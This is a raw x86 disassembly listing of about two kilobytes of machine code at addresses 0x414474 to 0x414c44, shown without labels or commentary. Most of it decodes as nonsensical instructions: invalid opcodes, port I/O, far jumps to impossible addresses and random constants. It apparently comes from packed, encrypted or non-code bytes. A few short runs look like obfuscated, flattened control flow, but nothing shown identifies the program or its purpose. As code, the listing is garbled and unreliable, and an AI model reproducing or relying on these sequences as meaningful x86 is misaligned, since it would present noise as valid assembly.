  414474:	enter  0x4196,0x7f
  414478:	cmp    DWORD PTR [ebx-0x67],0xffffffd7
  41447c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41447d:	mov    ds:0x52719030,eax
  414482:	loop   0x4144eb
  414484:	sbb    DWORD PTR [ebx-0x2f5612ec],0xf2250fef
  41448e:	sbb    eax,0xedfdd91d
  414493:	repz mov bl,BYTE PTR [edi]
  414496:	xchg   ecx,eax
  414497:	loope  0x4144b4
  414499:	outs   dx,BYTE PTR ds:[esi]
  41449a:	mov    BYTE PTR [edx],ch
  41449c:	dec    ecx
  41449d:	xchg   ebp,eax
  41449e:	fcom   DWORD PTR [edx-0x55843953]
  4144a4:	and    BYTE PTR [edx],ch
  4144a6:	sbb    al,0x48
  4144a8:	push   ebx
  4144a9:	pop    edx
  4144aa:	mov    al,BYTE PTR [eax+0x3af7516f]
  4144b0:	mov    ch,0xbe
  4144b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144b3:	cmp    BYTE PTR [eax-0x22],dh
  4144b6:	mov    es,WORD PTR [edx]
  4144b8:	mov    ebx,0x9fe738c2
  4144bd:	ficomp WORD PTR [ebp-0x97a3dcc]
  4144c3:	in     eax,0x15
  4144c5:	sbb    edx,DWORD PTR [edi+edi*2]
  4144c8:	imul   edx,DWORD PTR [eax-0x35678b60],0xffffff89
  4144cf:	inc    ebx
  4144d0:	push   0x7b
  4144d2:	sbb    DWORD PTR [ecx-0x4a],0xffffffbc
  4144d6:	dec    eax
  4144d7:	cmp    ebx,eax
  4144d9:	sar    BYTE PTR [ebx-0x1507acd6],1
  4144df:	push   esp
  4144e0:	pop    ss
  4144e1:	and    ecx,DWORD PTR [ebx+0x1f0cf347]
  4144e7:	test   BYTE PTR ss:[esi-0x80],bh
  4144eb:	fs das 
  4144ed:	lea    ebx,[edi+0x34fab867]
  4144f3:	frstor [eax+0x559063b9]
  4144f9:	test   DWORD PTR [eax],ecx
  4144fb:	inc    esi
  4144fc:	xchg   esp,eax
  4144fd:	icebp  
  4144fe:	add    al,0x2f
  414500:	in     al,0x6
  414502:	jl     0x4144ef
  414504:	xor    eax,0xa894e612
  414509:	dec    ebp
  41450a:	inc    edx
  41450b:	ror    BYTE PTR [edx],0x8c
  41450e:	dec    edi
  41450f:	gs push ebx
  414511:	(bad)  
  414512:	push   esp
  414513:	mov    edi,DWORD PTR [eax+0x4e0c67e0]
  414519:	sar    DWORD PTR [ebp-0x4d],cl
  41451c:	scas   eax,DWORD PTR es:[edi]
  41451d:	or     al,0x91
  41451f:	cmp    BYTE PTR [edx-0x25ce30b7],al
  414525:	(bad)  
  414526:	xchg   esp,eax
  414527:	pop    ecx
  414528:	mov    dl,0xd3
  41452a:	jmp    0x2f56:0x9eed6cdb
  414531:	aad    0x34
  414533:	sahf   
  414534:	pop    eax
  414535:	into   
  414536:	jae    0x4145a4
  414538:	rcr    DWORD PTR [ecx],cl
  41453a:	sbb    eax,0xf003071e
  41453f:	cmp    ebp,esp
  414541:	xor    eax,0xd3ac6949
  414546:	(bad)  
  414547:	sbb    cl,ch
  414549:	test   al,0x99
  41454b:	mov    ebx,0x55600f53
  414550:	dec    esp
  414551:	pushf  
  414552:	fiadd  WORD PTR [edx]
  414554:	test   DWORD PTR [esi-0x7d901d5a],0x98a02677
  41455e:	shl    bh,1
  414560:	inc    esi
  414561:	inc    ebp
  414562:	push   esi
  414563:	sbb    dl,cl
  414565:	xchg   edx,eax
  414566:	and    al,0xa4
  414568:	sub    DWORD PTR [esi],edi
  41456a:	jge    0x41456f
  41456c:	inc    esp
  41456d:	jp     0x414574
  41456f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414570:	ret    
  414571:	cmp    edi,DWORD PTR [eax]
  414573:	in     eax,dx
  414574:	dec    edx
  414575:	pop    ss
  414576:	add    BYTE PTR [edi-0x7050c665],al
  41457c:	inc    ebp
  41457d:	mov    esi,0xcd73c812
  414582:	inc    esp
  414583:	fptan  
  414585:	cwde   
  414586:	xchg   edi,eax
  414587:	mov    cl,0x38
  414589:	fs dec esi
  41458b:	push   bx
  41458d:	jae    0x414537
  41458f:	sbb    DWORD PTR [edi-0x22],esp
  414592:	jae    0x414535
  414594:	ss fucomip st,st(1)
  414597:	dec    edi
  414598:	or     eax,0x24c61c9f
  41459d:	inc    esp
  41459e:	jge    0x414522
  4145a0:	clc    
  4145a1:	dec    esp
  4145a2:	data16 cmp al,0x4a
  4145a5:	(bad)  
  4145a6:	fadd   DWORD PTR [ecx-0x186f2b29]
  4145ac:	fld    QWORD PTR [eax]
  4145ae:	icebp  
  4145af:	cmp    BYTE PTR [eax+0x5b191b8e],dl
  4145b5:	cmp    eax,0xaaad62fd
  4145ba:	cmp    eax,0x31814b73
  4145bf:	and    BYTE PTR [ebp-0x2bab7570],dl
  4145c5:	pop    edx
  4145c6:	mov    eax,edi
  4145c8:	call   0xc44c:0x219a176f
  4145cf:	lahf   
  4145d0:	mov    eax,0xcc8a2e10
  4145d5:	fcmovnu st,st(6)
  4145d7:	into   
  4145d8:	xor    cl,bl
  4145da:	mov    esp,0x733b6fc6
  4145df:	push   edi
  4145e0:	pusha  
  4145e1:	and    al,0x26
  4145e3:	xor    al,0xf9
  4145e5:	add    ebp,DWORD PTR [edi-0x71fdec22]
  4145eb:	xchg   esp,eax
  4145ec:	call   0x1ccbdef9
  4145f1:	loopne 0x414631
  4145f3:	sub    eax,0xd0cf14ae
  4145f8:	jo     0x414591
  4145fa:	sub    edx,edx
  4145fc:	and    BYTE PTR [ebp+0x30b6acde],dl
  414602:	pop    edx
  414603:	dec    ebp
  414604:	dec    ecx
  414605:	lea    esi,[ecx+0x4e]
  414608:	and    eax,0x4c9833f7
  41460d:	aad    0xc8
  41460f:	cwde   
  414610:	sub    BYTE PTR [ecx+edi*4-0x53],bl
  414614:	sbb    eax,0xe29c706e
  414619:	mov    bl,0x8f
  41461b:	sbb    ecx,DWORD PTR [edx+0x56]
  41461e:	mov    eax,DWORD PTR [ecx-0x3e]
  414621:	ins    BYTE PTR es:[edi],dx
  414622:	cmp    esi,esp
  414624:	sub    eax,0x847610eb
  414629:	lahf   
  41462a:	mov    al,ds:0x3ac0e95c
  41462f:	fsubr  QWORD PTR [ebx+0x14f2d07d]
  414635:	shl    DWORD PTR [bp+di-0x44],cl
  414639:	add    al,0x2c
  41463b:	cmp    DWORD PTR [ecx-0x39],ebp
  41463e:	stc    
  41463f:	cwde   
  414640:	test   al,0xdf
  414642:	(bad)  
  414643:	outs   dx,BYTE PTR ds:[esi]
  414644:	ret    0x1b1e
  414647:	mov    BYTE PTR [edx+0x6f482c8e],bl
  41464d:	into   
  41464e:	cmp    DWORD PTR [ecx],edx
  414650:	out    0xd7,eax
  414652:	pop    es
  414653:	mov    bh,0xf1
  414655:	mov    eax,0x8dc7ece7
  41465a:	dec    ecx
  41465b:	imul   edx,edi
  41465e:	mov    edi,DWORD PTR [ebp-0x18]
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	add    BYTE PTR [edx],0xcf
  414674:	mov    ecx,DWORD PTR [esi+ebp*4]
  414677:	movq   QWORD PTR [eax-0x1b],mm7
  41467b:	jle    0x4146f5
  41467d:	js     0x414694
  41467f:	pop    ebp
  414680:	popa   
  414681:	retf   0xfce8
  414684:	xor    DWORD PTR [ecx+edi*4+0x1b58df9e],ecx
  41468b:	cmc    
  41468c:	sub    DWORD PTR [ebp+0x20],eax
  41468f:	push   esi
  414690:	and    al,0xe4
  414692:	jp     0x4146e3
  414694:	stos   DWORD PTR es:[edi],eax
  414695:	(bad)  [edi-0x2]
  414698:	out    0x2,al
  41469a:	cli    
  41469b:	xchg   BYTE PTR [eax-0x5518d185],dh
  4146a1:	mov    DWORD PTR [edx+esi*2-0x7a],ecx
  4146a5:	imul   edx,DWORD PTR [ecx-0x33],0x62
  4146a9:	mov    DWORD PTR [eax-0xf8743ea],edx
  4146af:	or     ch,BYTE PTR [eax]
  4146b1:	lock cmp al,0x5c
  4146b4:	xchg   edi,eax
  4146b5:	push   esp
  4146b6:	shl    BYTE PTR [ecx],cl
  4146b8:	xor    BYTE PTR [eax],cl
  4146ba:	in     al,0x1f
  4146bc:	lahf   
  4146bd:	std    
  4146be:	stos   BYTE PTR es:[edi],al
  4146bf:	pop    ebp
  4146c0:	pmuludq mm6,QWORD PTR [edx*1+0xead5956]
  4146c8:	xor    eax,0x8c8465d1
  4146cd:	bound  edi,QWORD PTR [esi]
  4146cf:	xchg   esp,eax
  4146d0:	repnz outs dx,DWORD PTR ds:[esi]
  4146d2:	push   eax
  4146d3:	add    esi,DWORD PTR [esi+ebx*4]
  4146d6:	dec    ecx
  4146d7:	ror    BYTE PTR [ebx],0x90
  4146da:	test   BYTE PTR [edi-0x3c],bh
  4146dd:	mov    esi,0x7ce10a7f
  4146e2:	jnp    0x41470c
  4146e4:	push   edx
  4146e5:	lock mov al,ds:0x55a8192e
  4146eb:	dec    esp
  4146ec:	adc    DWORD PTR [esi+esi*8],esi
  4146ef:	xchg   ebp,eax
  4146f0:	xchg   esp,eax
  4146f1:	xchg   DWORD PTR [esi+0x3fa478ca],ebx
  4146f7:	sub    dh,BYTE PTR [esp+esi*2]
  4146fa:	fnstsw WORD PTR [ebp-0x7352a454]
  414700:	js     0x41471b
  414702:	adc    al,0xac
  414704:	xor    BYTE PTR [eax-0x256ec5ea],bl
  41470a:	adc    eax,0xe08a7c31
  41470f:	mov    esp,0xc0fa77
  414714:	adc    eax,0x57d1f434
  414719:	sbb    BYTE PTR ds:0xb1faa558,ah
  41471f:	int    0x5
  414721:	dec    esp
  414722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414723:	cmp    dl,BYTE PTR [ebx-0x7]
  414726:	mov    ds:0x445487e8,eax
  41472b:	imul   ebx,eax,0x31
  41472e:	in     al,0x97
  414730:	lock mov ecx,0x6d08f408
  414736:	xchg   esi,eax
  414737:	and    eax,0x905c429b
  41473c:	mov    al,0x14
  41473e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41473f:	out    0x28,al
  414741:	xor    bl,BYTE PTR [edi+0x61020e39]
  414747:	jecxz  0x4147b5
  414749:	je     0x414744
  41474b:	lds    edi,FWORD PTR [edi+0x38]
  41474e:	ins    BYTE PTR es:[edi],dx
  41474f:	out    0x64,eax
  414751:	dec    ecx
  414752:	fdivp  st(6),st
  414754:	mov    WORD PTR [edi-0x75a97d3a],cs
  41475a:	loop   0x414714
  41475c:	fsub   QWORD PTR [eax]
  41475e:	mov    al,ds:0xa616563d
  414763:	test   DWORD PTR [ebx],ecx
  414765:	cwde   
  414766:	sbb    ebp,DWORD PTR [ebx]
  414768:	jmp    0x173e613c
  41476d:	mov    ecx,0x769b6f33
  414772:	stos   DWORD PTR es:[edi],eax
  414773:	fwait
  414774:	xchg   esi,ebp
  414776:	jns    0x4147e6
  414778:	cdq    
  414779:	jecxz  0x41470f
  41477b:	xchg   ecx,eax
  41477c:	adc    eax,0xf7e79b6f
  414781:	pop    DWORD PTR [edi-0x7b]
  414784:	dec    ecx
  414785:	mov    esi,0x7c1512cb
  41478a:	fistp  QWORD PTR ds:0x390ef94d
  414790:	pop    edx
  414791:	or     dl,bl
  414793:	lods   al,BYTE PTR ds:[esi]
  414794:	pop    ds
  414795:	stc    
  414796:	push   0x68
  414798:	mov    eax,0xdc249712
  41479d:	pop    edi
  41479e:	je     0x4147e9
  4147a0:	popa   
  4147a1:	outs   dx,BYTE PTR ds:[esi]
  4147a2:	fld    TBYTE PTR [ebx+0x5c6a3ca7]
  4147a8:	enter  0xf42,0x23
  4147ac:	arpl   WORD PTR [ebx-0x55c6676c],bp
  4147b2:	int3   
  4147b3:	sub    ebx,DWORD PTR [ebx-0x44f2ec4e]
  4147b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147ba:	push   es
  4147bb:	mov    ecx,0x4add48ed
  4147c0:	sub    edi,0x20
  4147c3:	fsub   DWORD PTR [eax-0x14]
  4147c6:	out    0x46,al
  4147c8:	lods   al,BYTE PTR ds:[esi]
  4147c9:	add    al,0x4d
  4147cb:	pop    es
  4147cc:	cs int 0x65
  4147cf:	(bad)  
  4147d0:	mov    DWORD PTR [ebp+0x39],eax
  4147d3:	sub    BYTE PTR [eax+0xf],ah
  4147d6:	sub    eax,0x9f0f136d
  4147db:	aaa    
  4147dc:	outs   dx,BYTE PTR ds:[esi]
  4147dd:	fisubr DWORD PTR [ecx-0x12321457]
  4147e3:	lock sbb ecx,DWORD PTR [ebx+0x4efeff92]
  4147ea:	idiv   ebp
  4147ec:	add    ecx,DWORD PTR [esi-0x2126e255]
  4147f2:	fdiv   QWORD PTR [edx+0x47c04179]
  4147f8:	or     BYTE PTR [edi+0x4face995],ah
  4147fe:	dec    edi
  4147ff:	cmp    al,0x33
  414801:	ds xchg edi,eax
  414803:	dec    esi
  414804:	imul   BYTE PTR [edi-0xa]
  414807:	sub    eax,0x839d9205
  41480c:	push   ecx
  41480d:	push   ebx
  41480e:	or     DWORD PTR [ecx],edi
  414810:	sbb    eax,0xb3385741
  414815:	jp     0x4147f1
  414817:	push   ecx
  414818:	mov    bl,0x16
  41481a:	jne    0x414879
  41481c:	retf   0xc7e0
  41481f:	pop    esp
  414820:	adc    al,0xce
  414822:	popf   
  414823:	inc    ebp
  414824:	xor    al,0x5
  414826:	repz xchg ebp,eax
  414828:	nop
  414829:	push   ecx
  41482a:	jae    0x414824
  41482c:	outs   dx,DWORD PTR ds:[esi]
  41482d:	inc    ebp
  41482e:	(bad)  
  41482f:	sub    eax,0x6ee00882
  414834:	into   
  414835:	sbb    eax,edi
  414837:	shl    DWORD PTR [edx],1
  414839:	add    al,0xb0
  41483b:	or     ah,al
  41483d:	jb     0x414810
  41483f:	push   0x59
  414841:	mov    al,ds:0x3d3e295d
  414846:	fdiv   st(2),st
  414848:	hlt    
  414849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41484a:	mov    ebx,esi
  41484c:	sbb    DWORD PTR [esi],0x5fda744c
  414852:	pushf  
  414853:	or     ecx,DWORD PTR [eax+0x6e]
  414856:	out    0xb2,al
  414858:	xchg   ebx,eax
  414859:	jl     0x414893
  41485b:	shl    DWORD PTR [ebp-0x75d53007],1
  414861:	mul    DWORD PTR [esi]
  414863:	mov    ds:0x2f2db0fd,eax
  414868:	xchg   edx,eax
  414869:	add    bl,dh
  41486b:	bound  ebx,QWORD PTR ds:[edi]
  41486e:	cdq    
  41486f:	(bad)  [eax+0x692c5e5f]
  414875:	push   esp
  414876:	lods   al,BYTE PTR ds:[esi]
  414877:	inc    esp
  414878:	xchg   esp,eax
  414879:	xchg   edi,eax
  41487a:	std    
  41487b:	sbb    DWORD PTR [ebx-0x17],ebp
  41487e:	jmp    0x4148ae
  414880:	mov    ds:0xe7f330f0,eax
  414885:	pop    ds
  414886:	pop    ds
  414887:	mov    edx,es
  414889:	mov    eax,0x80a78d90
  41488e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41488f:	(bad)  
  414890:	cs aam 0xea
  414893:	arpl   sp,cx
  414895:	and    DWORD PTR [eax+0x711f1e88],eax
  41489b:	push   ss
  41489c:	xor    al,0xf
  41489e:	loopne 0x41484f
  4148a0:	mov    ds:0x518dfb09,eax
  4148a5:	dec    edx
  4148a6:	aaa    
  4148a7:	pop    eax
  4148a8:	inc    ecx
  4148a9:	fwait
  4148aa:	jno    0x414860
  4148ac:	mov    bh,0xa4
  4148ae:	mov    bl,0x90
  4148b0:	(bad)  
  4148b1:	dec    ecx
  4148b2:	int    0x9f
  4148b4:	out    0x9e,al
  4148b6:	or     BYTE PTR [edx-0x7061c617],0xa3
  4148bd:	(bad)  
  4148be:	xlat   BYTE PTR ds:[ebx]
  4148bf:	inc    edi
  4148c0:	mov    BYTE PTR [ebp-0x1648be44],dh
  4148c6:	push   edx
  4148c7:	test   BYTE PTR [eax],ah
  4148c9:	jmp    0x414947
  4148cb:	fadd   DWORD PTR [eax]
  4148cd:	dec    esp
  4148ce:	mov    al,0x68
  4148d0:	xchg   esi,eax
  4148d1:	loope  0x41489c
  4148d3:	popa   
  4148d4:	inc    edx
  4148d5:	push   edi
  4148d6:	out    0x8a,al
  4148d8:	out    dx,al
  4148d9:	and    esp,DWORD PTR [edx]
  4148db:	mov    ds:0x2eaf7a5a,al
  4148e0:	sbb    ebp,DWORD PTR [ecx]
  4148e2:	pusha  
  4148e3:	aad    0x80
  4148e5:	add    eax,0x3335c8e8
  4148ea:	clc    
  4148eb:	add    edx,edi
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax+0x3d27854b]
  414921:	lahf   
  414922:	ja     0x4148ed
  414924:	sbb    ecx,DWORD PTR [edi+edi*2]
  414927:	js     0x41490e
  414929:	jle    0x4149a3
  41492b:	js     0x41491a
  41492d:	lock xor al,BYTE PTR [eax+0x11]
  414931:	aam    0x2d
  414933:	xor    al,0xb1
  414935:	out    0xe1,eax
  414937:	jge    0x414952
  414939:	inc    ebx
  41493a:	lods   eax,DWORD PTR ds:[esi]
  41493b:	and    BYTE PTR [edx+0x69],ah
  41493e:	jo     0x41498d
  414940:	sub    ch,BYTE PTR [ebx-0x33]
  414943:	dec    eax
  414944:	pop    ebx
  414945:	sub    al,0x2
  414947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414948:	jle    0x414939
  41494a:	sub    esp,edi
  41494c:	ret    0x25a4
  41494f:	clc    
  414950:	cld    
  414951:	jmp    0x40d3d4d8
  414956:	sub    ebp,DWORD PTR [edx+edx*1+0x9e327dc]
  41495d:	(bad)  
  41495f:	xchg   edx,eax
  414960:	mov    al,0xbc
  414962:	stos   BYTE PTR es:[edi],al
  414963:	fldcw  WORD PTR [ebp-0x3b]
  414966:	xchg   edx,eax
  414967:	sbb    edi,0x28e2c1d7
  41496d:	mov    ch,BYTE PTR [esi]
  41496f:	jl     0x4149d5
  414971:	shl    dl,0xc6
  414974:	xchg   esp,eax
  414975:	repz cmp dh,cl
  414978:	jns    0x414907
  41497a:	jle    0x414960
  41497c:	mov    edx,0x626353c7
  414981:	sahf   
  414982:	jmp    0xf41db474
  414987:	ins    DWORD PTR es:[edi],dx
  414988:	or     BYTE PTR [edx],bh
  41498a:	dec    edx
  41498b:	xlat   BYTE PTR ds:[ebx]
  41498c:	sti    
  41498d:	dec    ebp
  41498e:	(bad)  
  41498f:	jl     0x41497c
  414991:	inc    ebx
  414992:	sub    al,0x92
  414994:	sbb    bh,BYTE PTR [edx]
  414996:	and    edi,esi
  414998:	test   DWORD PTR [edx+0x79],ebp
  41499b:	retf   
  41499c:	mov    esp,0xa8cb8342
  4149a1:	ins    BYTE PTR es:[edi],dx
  4149a2:	stc    
  4149a3:	add    ecx,DWORD PTR [ecx]
  4149a5:	dec    esi
  4149a6:	and    dl,BYTE PTR [ecx-0x5f]
  4149a9:	bound  ecx,QWORD PTR [edx]
  4149ab:	inc    eax
  4149ac:	loopne 0x4149bb
  4149ae:	xchg   ebp,eax
  4149af:	jmp    0x799cd908
  4149b4:	push   0x68256da2
  4149b9:	shl    BYTE PTR ds:0xfb00dac3,0x82
  4149c0:	push   ds
  4149c1:	pop    esi
  4149c2:	add    dl,BYTE PTR [ebx]
  4149c4:	ins    BYTE PTR es:[edi],dx
  4149c5:	mov    ecx,0x2b2a92c2
  4149ca:	xor    bp,WORD PTR [ebx+0x7bad78fe]
  4149d1:	pop    ds
  4149d2:	daa    
  4149d3:	add    ebp,ebp
  4149d5:	adc    DWORD PTR [edi+edi*4],edx
  4149d8:	pop    esi
  4149d9:	pop    eax
  4149da:	adc    ebp,edx
  4149dc:	push   edx
  4149dd:	sub    bl,BYTE PTR [eax-0x33]
  4149e0:	mov    edx,ebx
  4149e2:	stos   DWORD PTR es:[edi],eax
  4149e3:	cld    
  4149e4:	inc    ebp
  4149e5:	mov    dl,0x4c
  4149e7:	scas   eax,DWORD PTR es:[edi]
  4149e8:	mov    ds:0x69d3cea7,al
  4149ed:	inc    edx
  4149ee:	or     DWORD PTR [ebp+0x7e],0xa1b49a82
  4149f5:	mov    dl,0x8f
  4149f7:	out    dx,eax
  4149f8:	sub    al,0xf8
  4149fa:	(bad)  
  4149fb:	xor    DWORD PTR [edi-0x3c],esi
  4149fe:	out    0x2a,eax
  414a00:	push   ebx
  414a01:	cld    
  414a02:	ins    BYTE PTR es:[edi],dx
  414a03:	mov    eax,0xe65591ef
  414a08:	xor    cl,BYTE PTR [ebp-0x2c]
  414a0b:	mov    BYTE PTR [edi-0x33],ch
  414a0e:	xchg   edi,eax
  414a0f:	mov    ds,ebp
  414a11:	int    0x61
  414a13:	inc    ebx
  414a14:	out    dx,eax
  414a15:	mov    esp,0x28d760f7
  414a1a:	mov    dh,0x91
  414a1c:	sub    al,0x35
  414a1e:	loope  0x414a53
  414a20:	xchg   ecx,eax
  414a21:	dec    esp
  414a22:	push   es
  414a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a24:	icebp  
  414a25:	dec    ebx
  414a26:	sub    ebx,DWORD PTR [edi+0x5e]
  414a29:	cld    
  414a2a:	push   ds
  414a2b:	cmc    
  414a2c:	mov    eax,0x8b858bb1
  414a31:	ja     0x414a73
  414a33:	xchg   edi,eax
  414a34:	test   edx,eax
  414a36:	sub    BYTE PTR [edx+eiz*1-0x2f],dl
  414a3a:	in     eax,dx
  414a3b:	rol    bl,0x78
  414a3e:	xchg   esi,eax
  414a3f:	adc    eax,0x46492d78
  414a44:	lock gs mov edi,0x7a89fdd7
  414a4b:	fld    QWORD PTR [eax+edx*2-0x3355713c]
  414a52:	mov    dh,0x28
  414a54:	mov    edx,DWORD PTR [ecx+0x6e56e369]
  414a5a:	push   ecx
  414a5b:	xor    eax,DWORD PTR [ebx+esi*2-0x50]
  414a5f:	cld    
  414a60:	fdiv   QWORD PTR [ecx]
  414a62:	test   BYTE PTR [eax+0xf],bh
  414a65:	and    eax,0x12bc5ee0
  414a6a:	mov    eax,0x89f7ef2e
  414a6f:	add    edi,eax
  414a71:	jbe    0x414aa5
  414a73:	mov    edi,0xa9cc9f9e
  414a78:	mov    ds:0xaff22742,eax
  414a7d:	and    ah,BYTE PTR [edx+0x463fdf]
  414a83:	fcom   QWORD PTR [eax-0x22a648d5]
  414a89:	out    dx,al
  414a8a:	jb     0x414ae8
  414a8c:	loopne 0x414a4a
  414a8e:	mov    fs:0xfccbe8bb,eax
  414a94:	jmp    0x500a1dd
  414a99:	retf   
  414a9a:	sbb    DWORD PTR [esp+edi*1+0x3a],edx
  414a9e:	mov    esp,0xac62309e
  414aa3:	jo     0x414a8d
  414aa5:	add    ecx,DWORD PTR [ebp+edi*2-0x658cb849]
  414aac:	dec    ebp
  414aad:	mov    BYTE PTR [edi-0x5ffd0a5e],dh
  414ab3:	pop    ebp
  414ab4:	and    eax,0x830e1f54
  414ab9:	ds test DWORD PTR gs:[ebp-0x4f],0xf2dafb1b
  414ac2:	xchg   esp,eax
  414ac3:	mov    edx,0x50ba87b0
  414ac8:	add    al,0x35
  414aca:	cmp    DWORD PTR [edi+0xca35222],ebx
  414ad0:	cwde   
  414ad1:	(bad)  
  414ad2:	loopne 0x414b1d
  414ad4:	pop    ss
  414ad5:	mov    esi,0x61355ae2
  414ada:	mov    cl,0xe8
  414adc:	push   ss
  414add:	mov    ah,0xa7
  414adf:	out    dx,al
  414ae0:	cwde   
  414ae1:	mov    al,0x6c
  414ae3:	add    ebp,DWORD PTR [ebx-0x4f]
  414ae6:	je     0x414b65
  414ae8:	mov    BYTE PTR [edi-0x5857f70a],ah
  414aee:	mov    esi,0x3c499ecf
  414af3:	in     eax,0xe9
  414af5:	push   es
  414af6:	pop    ds
  414af7:	inc    ecx
  414af8:	add    DWORD PTR ds:0x5fc80d7c,edx
  414afe:	dec    ebp
  414aff:	or     eax,0x9f042e13
  414b04:	fidiv  WORD PTR [eax]
  414b06:	icebp  
  414b07:	outs   dx,BYTE PTR ds:[esi]
  414b08:	shr    ebp,cl
  414b0a:	cmp    eax,0xb9f283b7
  414b0f:	fwait
  414b10:	jmp    0x1fc77eeb
  414b15:	sub    ah,al
  414b17:	cmp    dh,cl
  414b19:	rcl    BYTE PTR [edx+0x15],1
  414b1c:	retf   0xc04f
  414b1f:	in     al,0x82
  414b21:	push   ss
  414b22:	cmp    eax,0xcf5414bb
  414b27:	cmp    al,0xef
  414b29:	scas   eax,DWORD PTR es:[edi]
  414b2a:	cmc    
  414b2b:	push   ds
  414b2c:	dec    ebx
  414b2d:	fiadd  WORD PTR [esi+ecx*1-0x58f34e0]
  414b34:	xchg   ebx,eax
  414b35:	fidiv  WORD PTR [eax+0x5a]
  414b38:	push   ds
  414b39:	inc    esp
  414b3a:	adc    eax,0x3a3f30db
  414b3f:	std    
  414b40:	bound  ebx,QWORD PTR [edi]
  414b42:	aaa    
  414b43:	test   al,0xcc
  414b45:	rcl    DWORD PTR [esi],0x39
  414b48:	fs pushf 
  414b4a:	mov    al,ds:0xbce9d3fe
  414b4f:	jge    0x414ba4
  414b51:	mov    ecx,0x1ca07ef2
  414b56:	sbb    DWORD PTR [eax+0x1b18d807],edi
  414b5c:	adc    ebp,edi
  414b5e:	xchg   ebp,eax
  414b5f:	loop   0x414b57
  414b61:	mov    ah,0xc1
  414b63:	sub    edi,DWORD PTR [edx*4+0x44895986]
  414b6a:	cmp    ch,BYTE PTR [ebp-0x5d56065e]
  414b70:	push   esi
  414b71:	mov    ch,0xe8
  414b73:	imul   ebp,DWORD PTR [ebx],0x8d04069a
  414b79:	scas   al,BYTE PTR es:[edi]
  414b7a:	sub    BYTE PTR [eax-0xa5e582f],ch
  414b80:	mov    bl,0xb0
  414b82:	dec    esi
  414b83:	sub    eax,0xe67c646f
  414b88:	xor    DWORD PTR [edi],0xe6fab4d7
  414b8e:	cs xchg edx,eax
  414b90:	shl    DWORD PTR [edi-0x26],cl
  414b93:	pop    edi
  414b94:	dec    eax
  414b95:	je     0x414ba9
  414b97:	xor    edx,eax
  414b99:	add    edx,ecx
  414b9b:	imul   edx,ebx
  414b9e:	cmp    edx,edi
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	and    ah,BYTE PTR [edi]
  414bb3:	mov    BYTE PTR [eax+eax*4+0x12],cl
  414bb7:	jg     0x414c31
  414bb9:	in     eax,0x7e
  414bbb:	js     0x414c35
  414bbd:	fsubr  st(3),st
  414bbf:	xor    eax,ebp
  414bc1:	les    edx,FWORD PTR [ebp-0x40]
  414bc4:	inc    esp
  414bc5:	and    ebx,DWORD PTR [ecx-0x65]
  414bc8:	cmp    al,0x9f
  414bca:	mov    edi,0x7b135649
  414bcf:	mov    cl,0x26
  414bd1:	sub    eax,0xe7a34a5e
  414bd6:	fmul   QWORD PTR [edi+0x36a6baa]
  414bdc:	loopne 0x414b94
  414bde:	jg     0x414c2a
  414be0:	pop    esi
  414be1:	lods   eax,DWORD PTR ds:[esi]
  414be2:	fdiv   QWORD PTR [esi+0x41]
  414be5:	mov    BYTE PTR [ecx],bl
  414be7:	les    ebp,FWORD PTR [edx+0x9]
  414bea:	xchg   edx,eax
  414beb:	xor    eax,0x78a219da
  414bf0:	dec    esp
  414bf1:	xchg   ecx,eax
  414bf2:	gs push 0x8a6b7aa8
  414bf8:	js     0x414c70
  414bfa:	stos   DWORD PTR es:[edi],eax
  414bfb:	scas   al,BYTE PTR es:[edi]
  414bfc:	pop    ebp
  414bfd:	pop    ebx
  414bfe:	scas   eax,DWORD PTR es:[edi]
  414bff:	xchg   edx,eax
  414c00:	or     BYTE PTR [ecx],ah
  414c02:	out    dx,al
  414c03:	jae    0x414c65
  414c05:	mov    esp,0x3d8d7b4
  414c0a:	push   ss
  414c0b:	scas   al,BYTE PTR es:[edi]
  414c0c:	ret    
  414c0d:	aam    0xd1
  414c0f:	jmp    0x414c00
  414c11:	mov    ecx,0x2c6b483c
  414c16:	scas   al,BYTE PTR es:[edi]
  414c17:	cmp    ecx,edi
  414c19:	mov    bl,0xac
  414c1b:	popa   
  414c1c:	adc    edx,DWORD PTR [edx+0x366f9498]
  414c22:	inc    ebx
  414c23:	out    dx,al
  414c24:	(bad)  
  414c25:	jo     0x414c7a
  414c27:	imul   ecx,DWORD PTR [esi+0x6b],0xffffffe0
  414c2b:	loope  0x414bfb
  414c2d:	lods   eax,DWORD PTR ds:[esi]
  414c2e:	shr    BYTE PTR [esi+ebp*4],1
  414c31:	(bad)  [ecx]
  414c33:	mov    fs,WORD PTR [esi]
  414c35:	test   DWORD PTR [edi+eax*4+0x63405922],eax
  414c3c:	xlat   BYTE PTR ds:[ebx]
  414c3d:	outs   dx,DWORD PTR ds:[esi]
  414c3e:	push   ebp
  414c3f:	mov    al,ds:0xab65a201
  414c44:	ins    BYTE PTR es:[edi],dx
